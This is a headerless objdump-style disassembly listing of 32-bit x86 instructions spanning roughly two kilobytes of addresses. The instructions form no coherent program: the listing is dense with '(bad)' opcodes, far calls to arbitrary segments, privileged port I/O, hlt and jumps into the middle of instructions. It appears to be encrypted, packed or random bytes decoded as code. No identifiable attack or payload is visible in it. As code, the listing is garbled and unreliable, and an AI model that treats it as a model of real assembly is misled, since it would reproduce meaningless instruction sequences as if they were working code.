  4017ac:	dec    ebx
  4017ad:	out    dx,eax
  4017ae:	aam    0xa7
  4017b0:	ret    0xee4d
  4017b3:	xor    ch,BYTE PTR [edi]
  4017b5:	dec    edi
  4017b6:	adc    DWORD PTR [edx],ebp
  4017b8:	inc    eax
  4017b9:	mov    bl,0x99
  4017bb:	adc    al,0x90
  4017bd:	push   0xfffffffa
  4017bf:	push   0xffffffa4
  4017c1:	xchg   ebx,eax
  4017c2:	sar    BYTE PTR [esi+0x21],0x35
  4017c6:	rcl    DWORD PTR [ebp+0x21b2a132],0x96
  4017cd:	lods   al,BYTE PTR ds:[esi]
  4017ce:	pop    ds
  4017cf:	fdivr  QWORD PTR [ebp-0x49c3df78]
  4017d5:	dec    ebx
  4017d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d7:	dec    edi
  4017d8:	jbe    0x40183f
  4017da:	push   esi
  4017db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017dc:	imul   edx,eax,0xffffff8b
  4017df:	popf   
  4017e0:	sbb    BYTE PTR [esp+eiz*2+0x47],al
  4017e4:	mov    dl,0x6e
  4017e6:	and    ah,ah
  4017e8:	or     DWORD PTR [edi],ebx
  4017ea:	pop    esp
  4017eb:	sub    BYTE PTR ds:0x4b0c150b,0xb9
  4017f2:	dec    esp
  4017f3:	add    eax,0xb69db511
  4017f8:	add    ah,BYTE PTR [edx+0x1cd22470]
  4017fe:	in     eax,0xfb
  401800:	inc    edi
  401801:	or     ecx,DWORD PTR [eax-0x52fb91eb]
  401807:	lods   eax,DWORD PTR ds:[esi]
  401808:	je     0x4017d4
  40180a:	call   0xa8c4:0xbf9ad893
  401811:	hlt    
  401812:	(bad)  
  401813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401814:	fst    DWORD PTR [esi+0x40]
  401818:	test   eax,0xb210c801
  40181d:	push   esp
  40181e:	ds fwait
  401820:	sub    esi,eax
  401822:	out    dx,eax
  401823:	mov    DWORD PTR ds:0x9d5a0205,esi
  401829:	(bad)  
  40182a:	jp     0x40181d
  40182c:	push   cs
  40182d:	rcr    al,1
  40182f:	bound  esi,QWORD PTR [edx+0x52b23a08]
  401835:	lods   al,BYTE PTR ds:[esi]
  401836:	shr    BYTE PTR [esi+0x64c40ac2],1
  40183c:	mov    esi,0x20ef2538
  401841:	(bad)  [ebx+0x3c]
  401844:	mov    dl,0xa2
  401846:	bound  ecx,QWORD PTR [edx-0x2]
  401849:	adc    DWORD PTR [ebp+eiz*8-0x7c],0xb
  40184e:	inc    esi
  40184f:	cwde   
  401850:	xchg   al,bh
  401852:	(bad)  
  401853:	out    dx,eax
  401854:	std    
  401855:	jnp    0x4017f1
  401857:	setno  bh
  40185a:	ins    BYTE PTR es:[edi],dx
  40185b:	add    ch,cl
  40185d:	int3   
  40185e:	cmc    
  40185f:	call   0x62d9:0xfe1a2624
  401866:	mov    al,ds:0x8717a356
  40186b:	inc    edi
  40186c:	loopne 0x4018b4
  40186e:	call   0x6221:0xf0f28c1c
  401875:	or     ebx,DWORD PTR [esi]
  401877:	jmp    0x81bc2094
  40187c:	loope  0x40183b
  40187e:	out    dx,al
  40187f:	push   es
  401880:	mov    ch,0xb2
  401882:	lods   eax,DWORD PTR ds:[esi]
  401883:	fwait
  401884:	mov    ebx,0xa1015a7f
  401889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40188a:	(bad)  
  40188b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188c:	aas    
  40188d:	out    0x1d,eax
  40188f:	int3   
  401890:	jbe    0x401841
  401892:	shr    edx,1
  401894:	mov    dl,0xdc
  401896:	xor    ebp,DWORD PTR [ebx+eiz*4+0x58bd6953]
  40189d:	or     edi,DWORD PTR [ebp+0x75145fc6]
  4018a3:	cmp    ecx,DWORD PTR [edi-0x4e086a10]
  4018a9:	xchg   ch,dl
  4018ab:	xchg   DWORD PTR [ebx-0x72d2a1fb],ebp
  4018b1:	repz cmp esp,DWORD PTR [edx+ecx*8-0x1aafb0e4]
  4018b9:	cmp    al,0x12
  4018bb:	ins    DWORD PTR es:[edi],dx
  4018bc:	sub    eax,0x81449508
  4018c1:	icebp  
  4018c2:	and    esp,DWORD PTR [edi+0x1b]
  4018c5:	xlat   BYTE PTR ds:[ebx]
  4018c6:	daa    
  4018c7:	adc    al,0x66
  4018c9:	or     esi,DWORD PTR [edi-0x67]
  4018cc:	jno    0x40192b
  4018ce:	in     eax,dx
  4018cf:	std    
  4018d0:	jmp    0x4018e8
  4018d2:	call   0xab5d:0x44f24223
  4018d9:	fnstenv [ebx-0x59]
  4018dc:	push   es
  4018dd:	and    al,0x7f
  4018df:	outs   dx,BYTE PTR ds:[esi]
  4018e0:	jae    0x4018a0
  4018e2:	push   cs
  4018e3:	push   ss
  4018e4:	mov    dl,0xec
  4018e6:	pop    ecx
  4018e7:	cmp    eax,0x1f641bb0
  4018ec:	mov    ds:0x9b9c4c76,eax
  4018f1:	icebp  
  4018f2:	call   0xa72c:0xc74e0cae
  4018f9:	add    eax,0x4442ac9a
  4018fe:	sbb    al,0x50
  401900:	adc    ebx,DWORD PTR [edi]
  401902:	mov    ch,0xa7
  401904:	add    al,al
  401906:	dec    ecx
  401907:	hlt    
  401908:	addr16 mov gs,ebx
  40190b:	sbb    cl,BYTE PTR [ecx-0x4d214021]
  401911:	sbb    DWORD PTR [esi+0x468bc561],ebx
  401917:	repz pop ebx
  401919:	or     al,0xa0
  40191b:	ret    0xdc2e
  40191e:	sub    al,BYTE PTR [edi+0x758d8a27]
  401924:	mov    dl,0x37
  401926:	jns    0x40192d
  401928:	lahf   
  401929:	add    dh,al
  40192b:	inc    edx
  40192c:	repz or esp,DWORD PTR [edx+0xa124bf1]
  401933:	add    BYTE PTR [esi],cl
  401935:	cmc    
  401936:	call   0x5ec1:0x5dfd4877
  40193d:	hlt    
  40193e:	mov    WORD PTR [eax-0x53d73993],gs
  401944:	repnz sub bh,dl
  401947:	(bad)  
  401948:	fwait
  401949:	bound  ebx,QWORD PTR [edx-0x33b609a3]
  40194f:	shr    DWORD PTR [ebx-0xa58065d],0x5
  401956:	dec    ebx
  401957:	pushf  
  401958:	xor    DWORD PTR [eax-0x5c],ebx
  40195b:	xor    BYTE PTR [edx+0x766d62e8],dh
  401961:	sub    ebx,eax
  401963:	pop    ebp
  401964:	fimul  DWORD PTR [ebx]
  401966:	popa   
  401967:	cmp    eax,0x509713c0
  40196c:	inc    eax
  40196d:	mov    ch,0x9a
  40196f:	test   BYTE PTR [esi-0x1d2f79f7],dh
  401975:	inc    esi
  401976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401977:	inc    ecx
  401978:	inc    edx
  401979:	or     bl,al
  40197b:	cld    
  40197c:	sbb    al,0xca
  40197e:	mov    DWORD PTR [ecx-0x522be396],edx
  401984:	lea    esp,[edi-0x71]
  401987:	daa    
  401988:	mov    dh,0x13
  40198a:	lahf   
  40198b:	xor    al,0x7
  40198d:	cmp    dh,BYTE PTR [ebx]
  40198f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401990:	jbe    0x401a03
  401992:	xchg   esi,eax
  401993:	jmp    0x4019f3
  401995:	pop    eax
  401996:	sub    eax,DWORD PTR [eax-0x348d544d]
  40199c:	scas   eax,DWORD PTR es:[edi]
  40199d:	int3   
  40199e:	sti    
  40199f:	ins    BYTE PTR es:[edi],dx
  4019a0:	jle    0x401a1b
  4019a2:	pop    esi
  4019a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019a4:	dec    esi
  4019a5:	jbe    0x4019bb
  4019a7:	push   ebp
  4019a8:	mov    ecx,0xb1e9af47
  4019ad:	out    dx,eax
  4019ae:	fldenv [ebx]
  4019b0:	inc    ecx
  4019b1:	pop    ds
  4019b2:	mov    ds:0xa39a2230,al
  4019b7:	cmp    ch,al
  4019b9:	pop    ebx
  4019ba:	int3   
  4019bb:	and    bl,bh
  4019bd:	jae    0x401943
  4019bf:	ffree  st(4)
  4019c1:	or     cl,al
  4019c3:	jns    0x401a26
  4019c5:	xchg   BYTE PTR [edi+0x5f],dl
  4019c8:	sub    al,0xd3
  4019ca:	mov    es,eax
  4019cc:	mov    DWORD PTR [esi-0x3e6a58ad],esp
  4019d2:	aad    0x1
  4019d4:	mov    bh,BYTE PTR [ebx-0x23]
  4019d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019d8:	xchg   edx,eax
  4019d9:	mov    al,0x41
  4019db:	dec    eax
  4019dc:	dec    edi
  4019dd:	dec    eax
  4019de:	mov    BYTE PTR [edx-0x4e],bh
  4019e1:	lahf   
  4019e2:	xchg   esi,eax
  4019e3:	jmp    DWORD PTR [edi-0x32e70dcb]
  4019e9:	or     ebp,eax
  4019eb:	setp   BYTE PTR [eax+edi*4-0x27]
  4019f0:	jl     0x4019b6
  4019f2:	xchg   BYTE PTR [ecx-0x2bebd3cc],bh
  4019f8:	(bad)  
  4019f9:	dec    ebx
  4019fa:	inc    edi
  4019fb:	and    cl,ah
  4019fd:	inc    edi
  4019fe:	mov    fs,WORD PTR [edi-0x328893b]
  401a04:	xchg   edi,eax
  401a05:	cmp    al,0x45
  401a07:	ss mov ch,0x35
  401a0a:	pop    esp
  401a0b:	cmp    edx,edx
  401a0d:	dec    esi
  401a0e:	mov    ch,BYTE PTR [edx+0xd]
  401a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a12:	sub    bh,BYTE PTR [ebx+0x677dccaa]
  401a18:	in     eax,dx
  401a19:	outs   dx,DWORD PTR ds:[esi]
  401a1a:	loope  0x4019f4
  401a1c:	mov    esp,0x57659a4f
  401a21:	or     eax,0x946a82c4
  401a26:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401a28:	ret    0xb51
  401a2b:	push   esi
  401a2c:	adc    DWORD PTR [esi-0x6a],ebx
  401a2f:	jnp    0x4019b5
  401a31:	stos   DWORD PTR es:[edi],eax
  401a32:	call   0xa162:0x9725ee14
  401a39:	loopne 0x401a6c
  401a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a3c:	jnp    0x401a9d
  401a3e:	aam    0x88
  401a40:	mov    edx,0x8a71f542
  401a45:	stc    
  401a46:	imul   ebp,DWORD PTR [eax-0x78e1a58c],0x71
  401a4d:	test   BYTE PTR [edi-0x8f4689a],al
  401a53:	push   0xffffffea
  401a55:	shr    DWORD PTR [eax+0x46],0xc5
  401a59:	sub    bl,BYTE PTR [edx+0x11289a8b]
  401a5f:	test   al,0x47
  401a61:	out    dx,eax
  401a62:	outs   dx,BYTE PTR ds:[esi]
  401a63:	dec    ecx
  401a64:	and    DWORD PTR [ebx],ecx
  401a66:	push   ds
  401a67:	imul   edx,ebx,0xffffff9e
  401a6a:	push   0xffffffbc
  401a6c:	xor    esi,edi
  401a6e:	call   0x412b:0xe4827f89
  401a75:	inc    ecx
  401a76:	sub    esp,DWORD PTR [edi-0x7c7109c]
  401a7c:	test   eax,esp
  401a7e:	or     DWORD PTR [ebp-0x4e],0x31
  401a82:	pop    es
  401a83:	jb     0x401a82
  401a85:	lods   al,BYTE PTR ds:[esi]
  401a86:	and    DWORD PTR [eax],ebx
  401a88:	xlat   BYTE PTR ds:[ebx]
  401a89:	add    eax,0xd12ed296
  401a8e:	cmp    esi,DWORD PTR [eax]
  401a90:	dec    ebx
  401a91:	ins    BYTE PTR es:[edi],dx
  401a92:	pop    ebp
  401a93:	imul   edi,DWORD PTR [ebx+0x8e7a4bb],0xffffff8c
  401a9a:	xor    esi,DWORD PTR [esi+edx*4-0x2c]
  401a9e:	jmp    0xafa6:0x1d43e18c
  401aa5:	sahf   
  401aa6:	inc    esi
  401aa7:	in     eax,dx
  401aa8:	mov    ah,BYTE PTR [edi-0x22]
  401aab:	inc    edi
  401aac:	inc    esi
  401aad:	mov    ds:0x44f76982,eax
  401ab2:	pop    edx
  401ab3:	pop    ebx
  401ab4:	cmp    BYTE PTR [eax-0x13],0x83
  401ab8:	(bad)  
  401aba:	push   edi
  401abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401abc:	jge    0x401a44
  401abe:	test   DWORD PTR [eax+ebp*4-0x40],ecx
  401ac2:	jmp    0x7964ccdd
  401ac7:	xchg   esi,eax
  401ac8:	scas   al,BYTE PTR es:[edi]
  401ac9:	xchg   esi,eax
  401aca:	xor    eax,0xd0bb02b
  401acf:	mov    DWORD PTR [esi-0x4ec102e2],esi
  401ad5:	ds fwait
  401ad7:	dec    eax
  401ad8:	add    al,0x40
  401ada:	test   al,0x17
  401adc:	fsub   DWORD PTR [edi]
  401ade:	dec    edx
  401adf:	sbb    ch,BYTE PTR [ebx+ecx*1+0x45]
  401ae3:	and    eax,0xc6405cf1
  401ae8:	dec    edx
  401ae9:	setp   BYTE PTR [eax]
  401aec:	daa    
  401aed:	dec    edx
  401aee:	jne    0x401af7
  401af0:	inc    edi
  401af1:	pop    eax
  401af2:	pusha  
  401af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401af4:	test   DWORD PTR [ebp+0x72],edi
  401af7:	pop    esi
  401af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af9:	mul    BYTE PTR [eax-0x67637dd7]
  401aff:	mov    ch,0x7e
  401b01:	ret    0xa768
  401b04:	adc    bl,BYTE PTR [esi-0x66effe4c]
  401b0a:	ror    BYTE PTR ds:0x9eabc3ad,0xb2
  401b11:	adc    BYTE PTR [esi],dl
  401b13:	push   cs
  401b14:	loopne 0x401a9e
  401b16:	rcl    edi,cl
  401b18:	ror    BYTE PTR [ebx],cl
  401b1a:	jmp    DWORD PTR [edx]
  401b1c:	and    ch,ch
  401b1e:	pusha  
  401b1f:	adc    ah,BYTE PTR [ebp-0x29]
  401b22:	mov    ds:0x6236c942,al
  401b27:	(bad)  [ecx-0x4e43d771]
  401b2d:	and    BYTE PTR [ebx],ch
  401b2f:	daa    
  401b30:	pop    es
  401b31:	lods   al,BYTE PTR ds:[esi]
  401b32:	enter  0x82a7,0x6d
  401b36:	fs daa 
  401b38:	(bad)  
  401b39:	sbb    edx,DWORD PTR [eax+0x5f8db27c]
  401b3f:	pop    eax
  401b40:	push   0xffffff9c
  401b42:	push   edx
  401b43:	mov    BYTE PTR [eax],ah
  401b45:	or     ebp,DWORD PTR [eax-0x44e35b48]
  401b4b:	imul   ecx,esp,0xfd0f9a4d
  401b51:	imul   esi,DWORD PTR [edx+0xcb994f9],0xffffffa7
  401b58:	sbb    edx,DWORD PTR [esi]
  401b5a:	(bad)  
  401b5b:	shl    BYTE PTR [esp+eax*8+0x41],1
  401b5f:	outs   dx,BYTE PTR ds:[esi]
  401b60:	mov    dl,0xc1
  401b62:	mov    ds:0x6c48ff98,eax
  401b67:	push   ebx
  401b68:	push   edi
  401b69:	out    0x1b,eax
  401b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b6c:	mov    dh,0xf3
  401b6e:	lea    esp,[eax]
  401b70:	test   BYTE PTR [esi-0x7005b790],al
  401b76:	dec    ebp
  401b77:	mov    al,ds:0x1237b6c
  401b7c:	test   DWORD PTR [ecx],esi
  401b7e:	jp     0x401ba7
  401b80:	cmp    edx,0xfffffffd
  401b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b84:	jle    0x401b0b
  401b86:	dec    edx
  401b87:	mov    BYTE PTR [ecx+0x1a],dh
  401b8a:	imul   edi,DWORD PTR [edx],0x815f8662
  401b90:	mov    cl,0xa0
  401b92:	inc    ecx
  401b93:	cmp    ch,bl
  401b95:	ja     0x401b6f
  401b97:	pop    eax
  401b98:	and    bh,BYTE PTR [esi+eax*4]
  401b9b:	cdq    
  401b9c:	arpl   WORD PTR [ebx],cx
  401b9e:	(bad)  
  401b9f:	test   al,0x84
  401ba1:	jae    0x401b76
  401ba3:	jle    0x401c21
  401ba5:	sbb    BYTE PTR [edx+0x47889861],0x3f
  401bac:	clc    
  401bad:	xor    edx,edi
  401baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb0:	cmp    ch,BYTE PTR [esi-0x79]
  401bb3:	mov    al,ds:0xcc0eaa56
  401bb8:	mov    bl,0x15
  401bba:	retf   
  401bbb:	cdq    
  401bbc:	ins    BYTE PTR es:[edi],dx
  401bbd:	ret    
  401bbe:	ss aam 0xd2
  401bc1:	adc    edi,edi
  401bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bc4:	xchg   esi,eax
  401bc5:	sub    al,0x27
  401bc7:	dec    cx
  401bc9:	imul   eax,DWORD PTR [ebx-0x76],0x2167c1b2
  401bd0:	loope  0x401c24
  401bd2:	sysexit 
  401bd4:	mov    WORD PTR [ecx],ds
  401bd6:	jne    0x401b73
  401bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bd9:	or     esi,DWORD PTR [ebx+eax*8]
  401bdc:	out    dx,eax
  401bdd:	push   eax
  401bde:	hlt    
  401bdf:	je     0x401b93
  401be1:	cmp    dh,BYTE PTR [edx]
  401be3:	dec    ecx
  401be4:	push   ecx
  401be5:	fistp  QWORD PTR [edi-0x13]
  401be8:	push   cs
  401be9:	or     esi,DWORD PTR [ecx]
  401beb:	and    al,0xb6
  401bed:	(bad)  
  401bee:	and    ah,al
  401bf0:	dec    esp
  401bf1:	sbb    DWORD PTR [edx-0x2ac4ea05],ebx
  401bf7:	dec    edi
  401bf8:	fsubr  QWORD PTR [esi+0x67e2a834]
  401bfe:	cmp    DWORD PTR [ebx+esi*2-0x44],ecx
  401c02:	mov    esi,0xf72b52dc
  401c07:	and    BYTE PTR [ecx-0x61d1392],dh
  401c0d:	mov    esi,0x9fec2fc0
  401c12:	pop    edi
  401c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c14:	inc    ebp
  401c15:	add    bl,BYTE PTR [esi-0x30]
  401c18:	mov    ah,0xe2
  401c1a:	xor    bl,bl
  401c1c:	mov    ebp,0x9829a156
  401c21:	dec    ebx
  401c22:	xchg   esp,eax
  401c23:	xchg   ax,ax
  401c25:	das    
  401c26:	pop    ebp
  401c27:	test   eax,0x2ef0687c
  401c2c:	jb     0x401c29
  401c2e:	mov    WORD PTR [ebx+edx*4-0x5a8261a2],fs
  401c35:	test   eax,0x6322bd0
  401c3a:	dec    ecx
  401c3b:	cmp    ecx,ebp
  401c3d:	or     ebx,DWORD PTR [edi-0x4a]
  401c40:	sub    al,0xeb
  401c42:	adc    DWORD PTR [ebx-0x2b61ff49],edx
  401c48:	sub    eax,0x722e529d
  401c4d:	mov    ds:0xb8813f2,eax
  401c52:	inc    esp
  401c53:	jmp    FWORD PTR [edx-0x4cca406a]
  401c59:	or     BYTE PTR [edx-0x77fed53d],bl
  401c5f:	xchg   edi,eax
  401c60:	mov    DWORD PTR [ecx+eax*2-0x59],ecx
  401c64:	idiv   DWORD PTR [ebx+0x5d]
  401c67:	out    dx,eax
  401c68:	sbb    DWORD PTR [edx+0x17fa1182],0x8957a770
  401c72:	push   edi
  401c73:	pop    ss
  401c74:	mov    ds:0x9aa044a2,al
  401c79:	repnz shl dl,0x7c
  401c7d:	add    eax,0x2a58705a
  401c82:	pop    es
  401c83:	jl     0x401c37
  401c85:	cs fwait
  401c87:	div    DWORD PTR [eax+0x48420b7f]
  401c8d:	or     ecx,DWORD PTR [edi+0x18355511]
  401c93:	es xchg ecx,eax
  401c95:	mov    esp,0x85b294e4
  401c9a:	data16 cmp BYTE PTR [ebp-0x23fead98],dh
  401ca1:	or     ebx,DWORD PTR [eax+0x5f]
  401ca4:	popa   
  401ca5:	lds    ebp,FWORD PTR [eax-0x1ff153fc]
  401cab:	add    esi,DWORD PTR [edx-0x6c1c047e]
  401cb1:	popf   
  401cb2:	call   0xdd67d940
  401cb7:	out    dx,al
  401cb8:	mov    edi,0x8b273716
  401cbd:	xchg   dl,dh
  401cbf:	shl    BYTE PTR [eax+0x19],0x9a
  401cc3:	arpl   WORD PTR [edi+0x20],si
  401cc6:	lods   al,BYTE PTR ds:[esi]
  401cc7:	cmp    eax,0xd5159edc
  401ccc:	inc    edx
  401ccd:	or     eax,DWORD PTR [ecx]
  401ccf:	scas   al,BYTE PTR es:[edi]
  401cd0:	mov    bh,0x70
  401cd2:	gs lahf 
  401cd4:	fsub   DWORD PTR [edx+0x2f8f9b9a]
  401cda:	(bad)  
  401cdb:	sub    eax,0x9ff52540
  401ce0:	es push 0xffffff9a
  401ce3:	mov    esp,0xba5255bf
  401ce8:	xchg   DWORD PTR [edx-0x66],edi
  401ceb:	fwait
  401cec:	cmp    al,0xff
  401cef:	mov    gs,WORD PTR ds:0xb5d70cad
  401cf5:	or     esi,DWORD PTR [ebx-0x7a]
  401cf8:	cmp    ecx,ebx
  401cfa:	in     eax,dx
  401cfb:	mov    ch,0x29
  401cfd:	rcr    BYTE PTR [ebp-0xd60f096],cl
  401d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d04:	xchg   edx,eax
  401d05:	pop    ecx
  401d06:	std    
  401d07:	es cwde 
  401d09:	or     edi,DWORD PTR [edi+eax*8+0x50]
  401d0d:	mov    ch,0xa7
  401d0f:	stc    
  401d10:	and    al,BYTE PTR [ecx]
  401d12:	in     eax,dx
  401d13:	xchg   esp,eax
  401d14:	lods   eax,DWORD PTR ds:[esi]
  401d15:	dec    esp
  401d16:	ret    
  401d17:	pushf  
  401d18:	jae    0x401d12
  401d1a:	lea    ecx,[ecx]
  401d1c:	or     ebp,esp
  401d1e:	mov    edx,0x2d09e694
  401d23:	loope  0x401d09
  401d25:	shr    esp,cl
  401d27:	mov    edx,ss
  401d29:	ror    BYTE PTR [ebx],cl
  401d2b:	fidiv  WORD PTR [edx-0x6e222de4]
  401d31:	and    eax,0xb068075
  401d36:	aad    0x7f
  401d38:	xlat   BYTE PTR ds:[ebx]
  401d39:	push   ebx
  401d3a:	mov    esi,0x64a96097
  401d3f:	adc    eax,0x53c7cfb3
  401d44:	fdiv   DWORD PTR [ecx+0x53]
  401d47:	lds    esi,FWORD PTR [edx+0x41]
  401d4a:	and    DWORD PTR [edi+0x616d0103],esp
  401d50:	pop    ecx
  401d51:	sbb    al,BYTE PTR [edx-0x23f84d8a]
  401d57:	js     0x401cf1
  401d59:	xor    BYTE PTR [ebx+eax*2],al
  401d5c:	and    DWORD PTR [ebx],ecx
  401d5e:	sub    dl,BYTE PTR [edi+0x51]
  401d61:	mov    bl,BYTE PTR ds:0x9a2403b3
  401d67:	lods   al,BYTE PTR ds:[esi]
  401d68:	pusha  
  401d69:	mov    esp,DWORD PTR [ecx]
  401d6b:	jp     0x401d6a
  401d6d:	add    al,0xe4
  401d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d70:	xor    al,0xf1
  401d72:	cmp    al,0x15
  401d74:	(bad)  
  401d75:	cli    
  401d76:	push   esi
  401d77:	test   DWORD PTR [ecx-0xb67e156],esi
  401d7d:	outs   dx,BYTE PTR ds:[esi]
  401d7e:	gs pop ss
  401d80:	mov    bh,BYTE PTR [ebp-0xe5f5802]
  401d86:	push   edi
  401d87:	shl    BYTE PTR [edi+ebp*1-0x6ff5266f],cl
  401d8e:	call   0x383d:0x78692513
  401d95:	sbb    al,ch
  401d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d98:	and    BYTE PTR [eax+ebx*8],bh
  401d9b:	xor    esi,DWORD PTR [edi]
  401d9d:	inc    edx
  401d9e:	aam    0x52
  401da0:	mov    dl,0x32
  401da2:	or     DWORD PTR [edi-0x184e621f],0xa98d1765
  401dac:	in     eax,0x8b
  401dae:	aad    0xb4
  401db0:	jmp    0xb2f59d30
  401db5:	fidivr DWORD PTR [eax-0x5b]
  401db8:	jp     0x401dcf
  401dba:	mov    eax,ds:0x8604ad3c
  401dbf:	or     eax,0xdbb33476
  401dc4:	cmp    eax,0x96b27a06
  401dc9:	add    eax,0xefb2e647
  401dce:	push   ebp
  401dcf:	out    dx,al
  401dd0:	cwde   
  401dd1:	adc    al,0x63
  401dd3:	jl     0x401d90
  401dd5:	add    BYTE PTR [esi],dl
  401dd7:	adc    esi,DWORD PTR [esi]
  401dd9:	cli    
  401dda:	call   0xa2f:0xe54bed54
  401de1:	test   al,0x9a
  401de3:	dec    eax
  401de4:	push   eax
  401de5:	or     eax,0xfc86e958
  401dea:	inc    edx
  401deb:	mov    al,ds:0x13a54f17
  401df0:	inc    esp
  401df1:	retf   
  401df2:	inc    BYTE PTR [ecx+0x14bc994e]
  401df8:	add    BYTE PTR [esp+edx*4-0x3e],ah
  401dfc:	pusha  
  401dfd:	imul   esp,DWORD PTR [ebx+0x6e],0xffffffa0
  401e01:	fs pop ecx
  401e03:	test   al,0x5b
  401e05:	cmp    esp,eax
  401e07:	adc    dl,BYTE PTR [edx]
  401e09:	loopne 0x401e20
  401e0b:	je     0x401e7c
  401e0d:	jge    0x401da9
  401e0f:	sti    
  401e10:	into   
  401e11:	cmp    DWORD PTR [eax+eax*8],edx
  401e14:	in     al,dx
  401e15:	jae    0x401e59
  401e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e18:	jno    0x401e6d
  401e1a:	inc    esi
  401e1b:	jmp    0x8db2:0xe3250e4c
  401e22:	test   ebx,edx
  401e24:	push   es
  401e25:	call   0xf34e:0x377563fb
  401e2c:	xor    eax,0x823000
  401e31:	retf   
  401e32:	xor    DWORD PTR [ebp+0x26956f3d],edi
  401e38:	inc    edi
  401e39:	ret    
  401e3a:	outs   dx,BYTE PTR ds:[esi]
  401e3b:	daa    
  401e3c:	repnz pop ss
  401e3e:	jl     0x401e90
  401e40:	jge    0x401e72
  401e42:	icebp  
  401e43:	inc    ebp
  401e44:	mov    dl,0x34
  401e46:	or     dl,BYTE PTR [ebp-0x66]
  401e49:	add    esp,DWORD PTR [esi+0x3b33b9fd]
  401e4f:	xchg   ebp,eax
  401e50:	out    dx,eax
  401e51:	or     edx,DWORD PTR [ecx-0x2526e632]
  401e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e58:	daa    
  401e59:	jp     0x401de7
  401e5b:	mov    edi,0xc5673a18
  401e60:	mov    dl,0x28
  401e62:	sub    ah,BYTE PTR [ebx+0x2a96724d]
  401e68:	or     eax,0x1ab2810b
  401e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e6e:	sbb    bl,al
  401e70:	xchg   esi,eax
  401e71:	mov    eax,ds:0x38a0279a
  401e76:	and    al,0xec
  401e78:	dec    edi
  401e79:	pushf  
  401e7a:	mov    ecx,0x967829a7
  401e7f:	jno    0x401ee1
  401e81:	or     BYTE PTR [edx+0x4d12acf5],dl
  401e87:	imul   esi,DWORD PTR [edx],0x9373e80
  401e8d:	and    BYTE PTR [eax+0x6e0f24a8],ah
  401e93:	xor    dl,BYTE PTR [ecx]
  401e95:	hlt    
  401e96:	pop    ds
  401e97:	imul   ebp,DWORD PTR [edx],0x19
  401e9a:	sub    DWORD PTR [edx+esi*4-0x7bdab99b],eax
  401ea1:	in     eax,dx
  401ea2:	or     esp,eax
  401ea4:	fisttp DWORD PTR [ebx]
  401ea6:	jmp    0xf94a15c6
  401eab:	bound  ebp,QWORD PTR [edx+edi*1-0x66]
  401eaf:	mov    ah,0x3e
  401eb1:	adc    al,0xc7
  401eb3:	dec    edi
  401eb4:	inc    eax
  401eb5:	aam    0xea
  401eb7:	stos   DWORD PTR es:[edi],eax
  401eb8:	pop    ss
  401eb9:	cmp    eax,0xeb58b777
  401ebe:	call   0xc922:0xd898a342
  401ec5:	add    al,0xff
  401ec7:	popf   
  401ec8:	and    ch,BYTE PTR [ebp-0x7933f166]
  401ece:	aam    0x5e
  401ed0:	cmp    al,0x31
  401ed2:	call   0xca64:0xce53950a
  401ed9:	sar    DWORD PTR [eax-0x16dda259],1
  401edf:	sbb    al,0xdc
  401ee1:	fwait
  401ee2:	pop    edi
  401ee3:	fwait
  401ee4:	mov    ah,0x1a
  401ee6:	arpl   WORD PTR [eax-0x4b],si
  401ee9:	fld    DWORD PTR [eax+0x6f3c4ea7]
  401eef:	xor    DWORD PTR [ebx-0x59],ebp
  401ef2:	in     eax,dx
  401ef3:	sbb    BYTE PTR [edx+0x69b8cfa9],dh
  401ef9:	lock adc al,0xef
  401efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401efd:	or     ebx,eax
  401eff:	push   ds
  401f00:	fistp  QWORD PTR [ebx+0x5576e2c3]
  401f06:	cwde   
  401f07:	sbb    al,0x52
  401f09:	jmp    0xeaefa421
  401f0e:	test   BYTE PTR ds:0x2a72c34b,0xca
  401f15:	or     eax,DWORD PTR ds:0x91d312e5
  401f1b:	mov    edi,0x8f86d126
  401f20:	test   BYTE PTR [ecx-0x5f8d04f9],bh
  401f26:	bound  esi,QWORD PTR [edx]
  401f28:	(bad)
  401f2d:	pop    ecx
  401f2e:	jb     0x401ed0
  401f30:	xchg   edx,eax
  401f31:	ret    0x3cf9
  401f34:	or     al,0xab
  401f36:	rcr    BYTE PTR [ebx-0x3865cfb3],1
  401f3c:	imul   ebp,eax,0x22
  401f3f:	not    DWORD PTR [ecx-0x30575827]
  401f45:	out    0x7e,eax
  401f47:	inc    edi
  401f48:	xor    ch,BYTE PTR [eax-0x74]
  401f4b:	sub    DWORD PTR [ecx+0xc],ecx
  401f4e:	call   0x2ca6:0xa64f46c1
  401f55:	fdivr  st,st(6)
  401f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f58:	lock sub dh,dl
  401f5b:	add    eax,0x2fc4155f
